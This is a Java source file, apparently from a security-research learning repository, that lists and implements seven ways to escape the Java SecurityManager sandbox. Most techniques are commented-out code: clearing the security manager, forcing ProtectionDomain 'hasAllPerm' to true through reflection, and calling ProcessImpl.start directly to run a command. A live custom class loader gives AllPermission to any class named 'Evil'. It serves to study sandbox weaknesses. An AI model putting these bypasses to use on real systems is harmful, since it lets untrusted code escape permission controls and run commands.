package com.threedr3am.bug.security.manager;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.AccessControlException;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

/**
 * 一般codeBase的方式设置了权限之后，那么没有显式设置的权限就代表不具有
 * 绕过方式（2-5的前提是具有反射权限）：
 * 1. 调用System.setSecurityManager(null) - 若没有("java.lang.RuntimePermission" "setSecurityManager")，则行不通
 *
 * 2. 反射获取System的security field，直接设置成null - sun.reflect.Reflection禁止反射System.security field，故行不通
 *
 * 3. 遍历当前执行线程栈每一个栈帧对应的class，利用方法getProtectionDomain()获取它的ProtectionDomain，
 *    然后反射修改权限标志hasAllPerm=true - 若没有("java.lang.RuntimePermission" "getProtectionDomain")权限，则行不通
 *
 * 4. 绕过getProtectionDomain()，直接反射调用私有方法getProtectionDomain0()获取ProtectionDomain，
 *    然后反射修改权限标志hasAllPerm=true - 若没有("java.lang.RuntimePermission" "accessDeclaredMembers")
 *    ("java.lang.reflect.ReflectPermission" "suppressAccessChecks")权限，则走不通，但一般不会禁止这些操作，
 *    只会通过Reflection的registerFieldsToFilter、registerMethodsToFilter方法区禁用反射哪些class、method、field
 *
 * 5. 直接反射java.lang.ProcessImpl的start方法执行命令 - pass
 *
 * 6. 自定义类加载器，在Class加载初始化ProtectionDomain时，给予全部权限
 *    - 若没有("java.lang.RuntimePermission" "createClassLoader")权限，则故行不通
 *
 * 7. 使用jni调用native方法绕过，需要本地可写库文件或类似windows这种通过网络文件系统webdav加载 - pass
 *
 * @author xuanyh
 */
public class AttackTest {

  public static void main(String[] args)
      throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException {
    //todo 1 需要权限("java.lang.RuntimePermission" "setSecurityManager")
//    System.setSecurityManager(null);
//    try {
//      FileInputStream fileInputStream = new FileInputStream(new File("/tmp/bbb"));
//      fileInputStream.close();
//    } catch (AccessControlException e) {
//      System.out.println("没有权限：" + e.getMessage());
//    }

    //todo 2
//    Field field = System.class.getDeclaredField("security");
//    field.setAccessible(true);
//    field.set(null, null);

    //todo 3 需要权限("java.lang.RuntimePermission" "getProtectionDomain")
//    StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
//    for (StackTraceElement s:stackTraceElements) {
//      Class clazz = Thread.currentThread().getContextClassLoader().loadClass(s.getClassName());
//      ProtectionDomain protectionDomain = clazz.getProtectionDomain();
//      Field field = protectionDomain.getClass().getDeclaredField("hasAllPerm");
//      field.setAccessible(true);
//      field.set(protectionDomain, true);
//    }
//    try {
//      FileInputStream fileInputStream = new FileInputStream(new File("/tmp/bbb"));
//      fileInputStream.close();
//    } catch (AccessControlException e) {
//      System.out.println("没有权限：" + e.getMessage());
//    }

    //todo 4 需要权限("java.lang.RuntimePermission" "accessDeclaredMembers") ("java.lang.reflect.ReflectPermission" "suppressAccessChecks")
//    StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
//    for (StackTraceElement s:stackTraceElements) {
//      Class clazz = Thread.currentThread().getContextClassLoader().loadClass(s.getClassName());
//      Method method = clazz.getClass().getDeclaredMethod("getProtectionDomain0");
//      method.setAccessible(true);
//      ProtectionDomain protectionDomain = (ProtectionDomain) method.invoke(clazz);
//      if (protectionDomain != null) {
//        Field field = protectionDomain.getClass().getDeclaredField("hasAllPerm");
//        field.setAccessible(true);
//        field.set(protectionDomain, true);
//      }
//    }
//    try {
//      FileInputStream fileInputStream = new FileInputStream(new File("/tmp/bbb"));
//      fileInputStream.close();
//    } catch (AccessControlException e) {
//      System.out.println("没有权限：" + e.getMessage());
//    }

    //todo 5
//    Class clz = Class.forName("java.lang.ProcessImpl");
//    Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
//    method.setAccessible(true);
//    method.invoke(clz,new String[]{"touch","/tmp/xxxxxxx"},null,null,null,false);

    //todo 6 需要权限("java.lang.RuntimePermission" "createClassLoader")
//    MyClassLoader myClassLoader = new MyClassLoader();
//    try {
//      Class<?> clazz = Class.forName("com.threedr3am.bug.security.manager.Evil", true, myClassLoader);
//      clazz.newInstance();
//    } catch (AccessControlException e) {
//      System.out.println("没有权限：" + e.getMessage());
//    } catch (InstantiationException e) {
//      e.printStackTrace();
//    }

    //todo 7 利用原生方法绕过的就不写了，记得上回那个比赛题目有的，好像是windows环境下利用webdav加载远程dll的方法，很赞
  }

}

/**
 * 自定义的类加载器，在加载类的时候给予类全部权限，从而使加载的恶意class能越权执行
 */
class MyClassLoader extends ClassLoader {

  @Override
  public Class<?> loadClass(String name) throws ClassNotFoundException {
    if (name.contains("Evil")) {
      return findClass(name);
    }
    return super.loadClass(name);
  }

  @Override
  protected Class<?> findClass(String name) throws ClassNotFoundException {
    File file = new File(
        this.getResource(".").getPath() + "/" + name.replace(".", "/") + ".class");
    if (file.exists()) {
      try {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedInputStream bufferedInputStream = new BufferedInputStream(
            new FileInputStream(file));
        byte[] bytes = new byte[1024];
        int size;
        while ((size = bufferedInputStream.read(bytes)) != -1) {
          byteArrayOutputStream.write(bytes, 0, size);
        }
        PermissionCollection pc = new Permissions();
        pc.add(new AllPermission());
        ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null,
            (Certificate[]) null), pc, this, null);
        Class<?> clazz = this.defineClass(name, byteArrayOutputStream.toByteArray(), 0,
            byteArrayOutputStream.size(), protectionDomain);
        return clazz;
      } catch (Exception e) {
        e.printStackTrace();
      }
    }
    return super.findClass(name);
  }
}
/**
 * grant codeBase "file:/Users/xuanyh/IdeaProjects/learnjavabug/target/classes/*" {
 *   permission java.io.FilePermission "/tmp/aaa","read";
 *   permission java.lang.RuntimePermission "accessDeclaredMembers";
 * };
 */
